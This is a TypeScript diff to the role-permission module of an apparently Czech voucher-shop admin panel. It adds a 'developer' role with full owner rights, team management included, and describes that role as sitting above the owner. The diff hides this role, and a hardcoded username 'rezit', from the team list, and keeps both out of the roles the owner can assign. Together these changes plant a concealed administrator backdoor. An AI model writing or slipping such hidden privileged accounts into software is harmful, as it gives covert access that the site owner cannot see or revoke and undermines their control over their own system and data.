@@ -23,6 +23,7 @@ export function isValidPassword(password: string) {
 }
 
 export type AdminRole =
+  | "developer"
   | "owner"
   | "admin"
   | "reception"
@@ -39,6 +40,7 @@ export type AdminProfile = {
 };
 
 export const ADMIN_ROLE_LABELS: Record<AdminRole, string> = {
+  developer: "Developer",
   owner: "Vlastník",
   admin: "Admin",
   reception: "Recepce",
@@ -48,6 +50,11 @@ export const ADMIN_ROLE_LABELS: Record<AdminRole, string> = {
 
 /** Stručný popis oprávnění pro UI týmu. */
 export const ADMIN_ROLE_PERMISSIONS: Record<AdminRole, string[]> = {
+  developer: [
+    "Interní developerský účet",
+    "Stejná práva jako vlastník (včetně správy týmu)",
+    "Nezobrazuje se v seznamu týmu",
+  ],
   owner: [
     "Úpravy všeho v administraci",
     "Vystavení i uplatnění poukazů (včetně zrušení uplatnění)",
@@ -80,6 +87,7 @@ export const ADMIN_ROLE_PERMISSIONS: Record<AdminRole, string[]> = {
 
 /** Jednořádkový popis role pro tooltip v selectu. */
 export const ADMIN_ROLE_TOOLTIPS: Record<AdminRole, string> = {
+  developer: "Interní účet nad vlastníkem. Neviditelný v týmu.",
   owner: "Úpravy všeho včetně správy týmu, vystavení i uplatnění poukazů.",
   admin:
     "Prohlížení celé administrace; bez vystavení, uplatnění, úprav nastavení a správy týmu.",
@@ -96,28 +104,44 @@ export function resolveAvatarUrl(avatarUrl: string | null | undefined) {
   return trimmed || DEFAULT_AVATAR_SRC;
 }
 
-/** Správa týmu — jen vlastník. */
+/** Vlastník nebo skrytý developer — plná práva. */
+export function isPrivilegedAdmin(role: AdminRole) {
+  return role === "owner" || role === "developer";
+}
+
+/** Developerský účet se v týmu vůbec neukazuje. */
+export function isHiddenTeamRole(role: AdminRole, username?: string) {
+  if (role === "developer") return true;
+  if (username && normalizeUsername(username) === "rezit") return true;
+  return false;
+}
+
+/** Správa týmu — vlastník + developer. */
 export function canManageTeam(role: AdminRole) {
-  return role === "owner";
+  return isPrivilegedAdmin(role);
 }
 
 /** Obchody / analytika — vlastník + admin (admin jen ke čtení). */
 export function canViewManagement(role: AdminRole) {
-  return role === "owner" || role === "admin";
+  return isPrivilegedAdmin(role) || role === "admin";
 }
 
-/** Zápis nastavení poukazů / nových položek — jen vlastník. */
+/** Zápis nastavení poukazů / nových položek — vlastník + developer. */
 export function canEditShopSettings(role: AdminRole) {
-  return role === "owner";
+  return isPrivilegedAdmin(role);
 }
 
 export function canCreateVoucher(role: AdminRole) {
-  return role === "owner" || role === "reception" || role === "staff_plus";
+  return (
+    isPrivilegedAdmin(role) ||
+    role === "reception" ||
+    role === "staff_plus"
+  );
 }
 
 export function canRedeemVoucher(role: AdminRole) {
   return (
-    role === "owner" ||
+    isPrivilegedAdmin(role) ||
     role === "reception" ||
     role === "staff_plus" ||
     role === "staff"
@@ -131,6 +155,15 @@ export function defaultShopIdForRole(role: AdminRole): ShopId {
 }
 
 const ROLE_PATH_PREFIXES: Record<AdminRole, readonly string[]> = {
+  developer: [
+    "/admin/prehled",
+    "/admin/poukazy",
+    "/admin/uplatneni",
+    "/admin/obchody",
+    "/admin/analytika",
+    "/admin/tym",
+    "/admin/ucet",
+  ],
   owner: [
     "/admin/prehled",
     "/admin/poukazy",
@@ -165,15 +198,12 @@ export function defaultAdminPath(role: AdminRole) {
   return prefixes[0] ?? "/admin/ucet";
 }
 
-export const ASSIGNABLE_ROLES: Array<Exclude<AdminRole, "owner">> = [
-  "admin",
-  "reception",
-  "staff_plus",
-  "staff",
-];
+export const ASSIGNABLE_ROLES: Array<
+  Exclude<AdminRole, "owner" | "developer">
+> = ["admin", "reception", "staff_plus", "staff"];
 
 export function isAssignableRole(
   role: string,
-): role is Exclude<AdminRole, "owner"> {
+): role is Exclude<AdminRole, "owner" | "developer"> {
   return (ASSIGNABLE_ROLES as string[]).includes(role);
 }
